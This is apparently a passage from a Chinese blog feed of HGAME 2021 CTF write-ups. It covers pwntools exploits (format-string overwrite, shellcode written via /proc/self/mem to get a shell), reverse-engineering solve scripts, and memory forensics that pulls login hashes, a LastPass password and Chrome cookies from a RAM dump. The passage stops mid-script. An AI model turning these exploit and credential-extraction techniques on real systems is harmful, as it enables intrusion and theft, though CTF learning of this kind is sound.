class="string">&#x27;a&#x27;</span>)+p64(retn_addr+<span class="number">2</span>)+p64(retn_addr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = (<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(target&amp;<span class="number">0xffff</span>)+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%10$hn&quot;</span>+<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>((target&amp;<span class="number">0xffff0000</span>)&gt;&gt;<span class="number">16</span> - (target&amp;<span class="number">0xffff</span>))+<span class="string">&quot;c&quot;</span>+<span class="string">&quot;%11$hn&quot;</span>).ljust(<span class="number">32</span>,<span class="string">&#x27;a&#x27;</span>)+p64(retn_addr)+p64(retn_addr+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,payload)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;说点什么\n&quot;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="5-patriot’s-note"><a href="#5-patriot’s-note" class="headerlink" title="5.patriot’s note"></a>5.patriot’s note</h2><h2 id="6-the-shop-of-cosmos"><a href="#6-the-shop-of-cosmos" class="headerlink" title="6.the_shop_of_cosmos"></a>6.the_shop_of_cosmos</h2><p><code>proc </code> 文件系统，<code>/proc/self/mem</code> 可读写程序，包括 <code>.text</code> 段，<code>/proc/self/maps</code> 获取各种基址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./shop&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 增加钱</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;-50&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取基址</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;：&#x27;</span>)</span><br><span class="line">prog_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">&#x27;-&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&quot;prog_base: &quot;</span>+<span class="built_in">hex</span>(prog_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写 shellcode</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;/proc/self/mem&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(prog_base+<span class="number">0x1652</span>))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Hgame Pwn题&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
    <category term="pwn" scheme="https://www.0wl.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week4-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week4-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week4-Writeup/</id>
    <published>2021-03-27T07:10:15.000Z</published>
    <updated>2021-11-16T14:54:13.031Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week4</p></div></article> <span id="more"></span><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="1-vm"><a href="#1-vm" class="headerlink" title="1.vm"></a>1.vm<img src="/2021/03/27/HGAME-Week4-Writeup/re1(4).png" class=""></h3><p>​    这部分逻辑很清晰，重点在中间这个加密的部分，点进去查看这个函数发现 switch-case 应该是vm，每个case都是一个 opcode</p><p>​    题目里说 ovm++ hates debugger ，那就先调试一下，调试后可以猜测出具体的加密部分</p><img src="/2021/03/27/HGAME-Week4-Writeup/re1(2).png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/re1(3).png" class=""><p>​    输入的 flag 先是经过异或加密，之后又有减法操作，加密后与密文进行比较，写脚本解一下就能得到 flag</p><img src="/2021/03/27/HGAME-Week4-Writeup/re1.png" class=""><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = [<span class="number">0xcf</span>,<span class="number">0xbf</span>,<span class="number">0x80</span>,<span class="number">0x3b</span>,<span class="number">0xf6</span>,<span class="number">0xaf</span>,<span class="number">0x7e</span>,<span class="number">0x02</span>,<span class="number">0x24</span>,<span class="number">0xed</span>,<span class="number">0x70</span>,<span class="number">0x3a</span>,<span class="number">0xf4</span>,<span class="number">0xeb</span>,<span class="number">0x7a</span>,<span class="number">0x4a</span>,<span class="number">0xe7</span>,<span class="number">0xf7</span>,<span class="number">0xa2</span>,<span class="number">0x67</span>,<span class="number">0x17</span>,<span class="number">0xf0</span>,<span class="number">0xc6</span>,<span class="number">0x76</span>,<span class="number">0x36</span>,<span class="number">0xe8</span>,<span class="number">0xad</span>,<span class="number">0x82</span>,<span class="number">0x2e</span>,<span class="number">0xdb</span>,<span class="number">0xb7</span>,<span class="number">0x4f</span>,<span class="number">0xe6</span>,<span class="number">0x09</span>]</span><br><span class="line">table1 = [<span class="number">0xFE</span>,<span class="number">0x21</span>,<span class="number">0x44</span>,<span class="number">0x67</span>,<span class="number">0x8A</span>,<span class="number">0xAD</span>,<span class="number">0xD0</span>,<span class="number">0xF3</span>,<span class="number">0x16</span>,<span class="number">0x39</span>,<span class="number">0x5c</span>,<span class="number">0x7f</span>,<span class="number">0xa2</span>,<span class="number">0xc5</span>,<span class="number">0xe8</span>,<span class="number">0x0b</span>,<span class="number">0x2e</span>,<span class="number">0x51</span>,<span class="number">0x74</span>,<span class="number">0x97</span>,<span class="number">0xba</span>,<span class="number">0xdd</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x46</span>,<span class="number">0x69</span>,<span class="number">0x8c</span>,<span class="number">0xaf</span>,<span class="number">0xd2</span>,<span class="number">0xf5</span>,<span class="number">0x18</span>,<span class="number">0x3b</span>,<span class="number">0x5e</span>,<span class="number">0x81</span>]</span><br><span class="line">table2 = [<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>,<span class="number">0xba</span>,<span class="number">0x5a</span>,<span class="number">0xfa</span>,<span class="number">0x9a</span>,<span class="number">0x3a</span>,<span class="number">0xda</span>,<span class="number">0x7a</span>,<span class="number">0x1a</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  <span class="keyword">if</span> cipher[i] + table2[<span class="number">33</span>-i] &lt; <span class="number">256</span>:</span><br><span class="line">    cipher[i] += table2[<span class="number">33</span>-i]</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    cipher[i] = cipher[i] + table2[<span class="number">33</span>-i] - <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">34</span>):</span><br><span class="line">  cipher[i] ^= table1[<span class="number">33</span>-i]</span><br><span class="line">  <span class="built_in">print</span>(<span class="built_in">chr</span>(cipher[i]),end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>​    这道题标准解法应该不是这样解的，而是要先要翻译出对应的汇编代码再分析，但这部分我还不太明白之后再补上吧</p><h3 id="2-A-5-Second-Challenge"><a href="#2-A-5-Second-Challenge" class="headerlink" title="2.A 5 Second Challenge"></a>2.A 5 Second Challenge</h3><p>​    这题要感谢小圆学长的耐心回答!!</p><p>​    下载得到的是用unity制作的扫雷游戏，刚开始为了获得源码用 il2cppdumper 处理 GameAssembly.dll ，但发现处理后得到的不全，之后问了一下小圆学长发现源码已经给了。</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2.png" class=""><p>​    打开 AFiveSecondChallenge.cpp ，源码里有 getUnixtime 这类获取时间的函数，游戏时间超过 5s 就会显示超时，用锁住系统时间的软件可以避开这一检测。锁定时间后就可以开始玩扫雷，几局下来后会发现雷的位置能构成二维码</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(2).png" class=""><p>​    根据题目提示，把 managed 文件夹下的 dll 拖到 ida 里，会发现有一个函数被nop掉了，定位到源码里查看（il2cpp的中间文件有些混乱，删除了影响判断的部分）</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(3).png" class=""><p>​    这里的 return <strong>判断是否是雷的位置</strong>，本来分析到这里已经很清楚了但是因为我完全不懂类和方法什么的看了挺久</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(4).png" class=""><p>​    GetAt函数的返回值没在源码里看到有初始赋值于是迷惑了好久，又去问了一下小圆学长这部分是在哪里初始化过，得到回复说是在那个 dll 里面。</p><p>​    但是我在我下载的东西里面没发现 m_Items 初始化的部分，去网站上重新下载并拖到 ilspy ，得到了这个数组里的值</p><img src="/2021/03/27/HGAME-Week4-Writeup/re2(5).png" class=""><p>​    接下来就是写脚本解题</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> matrix[<span class="number">45</span>][<span class="number">15</span>][<span class="number">3</span>] = ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">GetAt</span><span class="params">(i, j, k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> iBound = <span class="number">45</span>;<span class="comment">//45</span></span><br><span class="line">  <span class="keyword">int</span> jBound = <span class="number">15</span>;<span class="comment">//15</span></span><br><span class="line">  <span class="keyword">int</span> kBound = <span class="number">3</span>;<span class="comment">//3</span></span><br><span class="line">  <span class="keyword">return</span> matrix[i][j][k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> y,x;</span><br><span class="line">  FILE* fp;</span><br><span class="line">  fp = fopen(<span class="string">&quot;************&quot;</span> , <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">int</span> a[<span class="number">45</span>][<span class="number">45</span>];</span><br><span class="line">  <span class="keyword">int</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (y = <span class="number">0</span>; y &lt; <span class="number">45</span>; y++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (x = <span class="number">0</span>; x &lt; <span class="number">45</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">double</span> L_8 = GetAt(y, x / <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">double</span> L_14 = GetAt(y, x / <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">double</span> V_0 = L_14;</span><br><span class="line">      <span class="keyword">double</span> L_20 = GetAt(y, x / <span class="number">3</span>, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">double</span> V_1 = L_20;</span><br><span class="line">      <span class="keyword">double</span> V_2 = <span class="built_in">fmod</span>(x, <span class="number">3.0f</span>) - <span class="number">1.0f</span>;</span><br><span class="line">      a[x][y] = L_8* V_2* V_2 + V_0 * V_2 + V_1 &gt; <span class="number">0.0</span> ? <span class="number">1</span> : <span class="number">0</span>;<span class="comment">//1是雷</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">45</span>; i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">45</span>; j++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[j][i]);</span><br><span class="line">      <span class="keyword">if</span> (a[j][i] == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">fprintf</span>(fp, <span class="string">&quot;%d,%d\n&quot;</span>, j, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fclose(fp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x,y = np.loadtxt(<span class="string">&#x27;./xy.txt&#x27;</span>,delimiter=<span class="string">&#x27;,&#x27;</span>,unpack=<span class="literal">True</span>)</span><br><span class="line">plt.plot(x,y,<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/2021/03/27/HGAME-Week4-Writeup/re2(6).png" class=""><h3 id="3-nllvm"><a href="#3-nllvm" class="headerlink" title="3.nllvm"></a>3.nllvm</h3><p>​    拖到 ida 里发现挺乱的，也没看到控制台输出的那些文字，那就先调试看看</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(5).png" class=""><p>​    调试后发现这些异或操作得到的就是控制台输出的字符，在输出后又来了一遍异或还原。</p><p>​    接着调试发现判断输入字符串的地方</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(4).png" class=""><p>​    这一部分异或得到 <strong>“CryptoFAILUREforRSA2048Key!!!!!!”</strong>  这个字符串，接着来到加密的函数</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(3).png" class=""><p>​    传入的就是这部分异或得到字符串和输入的 flag，之后看了一下这个函数里面是一些比较复杂的运算猜测是某种算法，我对各种算法不是很熟所以用了 ida 插件 findcrypt ，但是这个插件并没有找到什么算法于是我就去找学长确认了一下</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(9).png" class=""><p>​    查了各种算法，最后发现加密函数里面的一个函数像是<strong>s盒</strong>，根据s盒数字判断又是 <strong>AES 加密</strong>  ( s盒也是异或得到的，这大概是插件检测不出算法的原因 )</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(2).png" class=""><p>​    在调试过程中可以知道 <strong>iv值是 123456789abcdef</strong> ，判断是否为正确 flag 的部分与密文进行比较，改变了输出字符的外观（表示是否回到现实）</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3(6).png" class=""><p>​    之后用我在week2写的脚本解就行</p><img src="/2021/03/27/HGAME-Week4-Writeup/re3.png" class=""><p>​    查了一下题目里的 llvm ，是一款代码混淆器，具体的是看了这篇文章<a href="https://bbs.pediy.com/thread-224484.htm">https://bbs.pediy.com/thread-224484.htm</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="1-Akira之瞳-1"><a href="#1-Akira之瞳-1" class="headerlink" title="1.Akira之瞳-1"></a>1.Akira之瞳-1</h3><p>​    查资料知道这种 dump 出来的RAW 文件要在 linux 里用 <strong>volatility</strong> 看，先查一下系统版本</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(6).png" class=""><p>​    接着用 pslist 查看一下系统进程，找到可疑的进程后 dump 出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(5).png" class=""><p>​    用 foremost 分离出一个加密的压缩包，本来以为密码还在 raw 文件里面的某个文件里来回看了好多遍，之后用 010editor 打开压缩包后发现提示，zip 密码是<strong>系统登陆密码</strong></p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(3).png" class=""><p>​    hashdump 一下得到登陆密码的 hash 值</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(4).jpg" class=""><p>​    按提示把密码解出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc1.png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/misc1(2).png" class=""><p>​    打开压缩包后发现两张图片，名字是src 和 blind，很容易就想到<strong>盲水印</strong>，用这个工具 (<a href="https://github.com/chishaxie/BlindWaterMark">https://github.com/chishaxie/BlindWaterMark</a>) 提取出水印</p><img src="/2021/03/27/HGAME-Week4-Writeup/flag.png" class=""><p>​    图片里小写的 L 是数字1</p><h3 id="2-Akira之瞳-2"><a href="#2-Akira之瞳-2" class="headerlink" title="2.Akira之瞳-2"></a>2.Akira之瞳-2</h3><p>​    得到一个加密压缩包和 RAW 文件，同样先查看一下进程，发现 notepad进程 dump出来</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(5).png" class=""><p>​    在 dump 出来的进程里查一下 password 字符串，得到 zip 密码</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(6).png" class=""><p>​    打开压缩包得到</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2.png" class=""><p>​    这几个文件名好像在哪里见过，翻了一下往年的 writeup 知道container 是<strong>加密容器</strong>，cookies 是chrome浏览器的 <strong>cookie 数据库</strong>。但是看 cookies 文件内容和打开加密卷都需要密码，回到 linux 里再查一下有无密码，因为是 notepad 进程那就查 <strong>txt 文件</strong></p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(8).png" class=""><p>​    这个 <strong>dumpme.txt</strong> 很可疑，提取出来发现之前 zip 密码还有后半句。百度一下知道 lastpass 是 chrome 浏览器的插件，用来记录密码的，把 lastpass 和 dump 放在一起搜索找到 volatility 里有 lastpass 这个插件</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(7).png" class=""><p>​    得到一个密码，下载 <strong>ChromeCookiesView</strong> ，加载 cookies 文件并输入密码，得到加密容器密码并提示用 <strong>VeraCrypt</strong> 打开</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(2).png" class=""><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(3).png" class=""><p>​    打开虚拟分区得到一张图片，查 ADS 得知 NTFS 隐写</p><blockquote><p>​    NTFS交换数据流（Alternate Data Streams，简称ADS）是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，意思是除了主文件流之外还可以有许多非主文件流寄宿在主文件流中，这些利用NTFS数据流寄宿并隐藏在系统中的非主文件流我们称之为ADS流文件。虽然我们无法看到ADS流文件，但它们却是真实存在。</p></blockquote><p>​    然后用 <strong>Ntfs Streams Editor</strong> 这个软件查看 ADS 流文件，得到 flag</p><img src="/2021/03/27/HGAME-Week4-Writeup/misc2(4).png" class=""><p>​    那个网址里的图是 Akira 学长的新头像</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    为时四周的 hgme 要结束了，这个寒假学到了很多东西过得很充实，希望以后能继续学习这方面的知识，不断进步</p>]]></content>
    
    
    <summary type="html">&lt;article class=&quot;message is-info&quot;&gt;&lt;div class=&quot;message-body&quot;&gt;
&lt;p&gt;Week4&lt;/p&gt;
&lt;/div&gt;&lt;/article&gt;</summary>
    
    
    
    <category term="Hgame2021" scheme="https://www.0wl.site/categories/Hgame2021/"/>
    
    
    <category term="hgame" scheme="https://www.0wl.site/tags/hgame/"/>
    
  </entry>
  
  <entry>
    <title>HGAME-Week3-Writeup</title>
    <link href="https://www.0wl.site/2021/03/27/HGAME-Week3-Writeup/"/>
    <id>https://www.0wl.site/2021/03/27/HGAME-Week3-Writeup/</id>
    <published>2021-03-27T07:01:21.000Z</published>
    <updated>2021-11-16T14:53:56.207Z</updated>
    
    <content type="html"><![CDATA[<article class="message is-info"><div class="message-body"><p>Week3</p></div></article> <span id="more"></span><h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="1-FAKE"><a href="#1-FAKE" class="headerlink" title="1.FAKE"></a>1.FAKE</h3><p>​    拖到ida</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(5).png" class=""><p>​    关键函数里有36个方程，36个变量，那就不可能普通的解出来，</p><p>​    查找字符串得到提示 <strong>Try angr or z3</strong>，我用的是 z3库，脚本太长了就不放了（用z3库解的时候一直跑不出结果，就去问了 r3n0学长，学长说可能需要点时间，但之后我重新弄了一下add的部分很快就跑出来了，应该是我自己中间操作上的问题….）</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(3).png" class=""><p>​    假flag，查一下<strong>SMC</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">SMC</span><span class="params">(self-Modifying Code)</span></span>，就是在真正执行某一段代码时，程序会对自身的该段代码进行自修改，只有在修改后的代码才是可汇编，可执行的。在程序未对该段代码进行修改之前，在静态分析状态下，均是不可读的字节码，IDA之类的反汇编器无法识别程序的正常逻辑。是一种反调试代码技术。</span><br></pre></td></tr></table></figure><p>​    在ida里找一下smc自解密的部分</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(2).png" class=""><p>​    这段代码执行后才得到真正的代码，写 idc 脚本来解密 ida 反编译后错误的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;idc.idc&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x00401216</span>;<span class="comment">//函数地址  </span></span><br><span class="line">    <span class="keyword">auto</span> addr2 = <span class="number">0x00409080</span>;  <span class="comment">//byte数组地址</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">0x43E</span>;i++)   </span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^Byte(addr2+i));  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    得到运行过程中真正的代码</p><img src="/2021/03/27/HGAME-Week3-Writeup/re1(4).png" class=""><p>​    这部分继续用z3库写脚本去解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 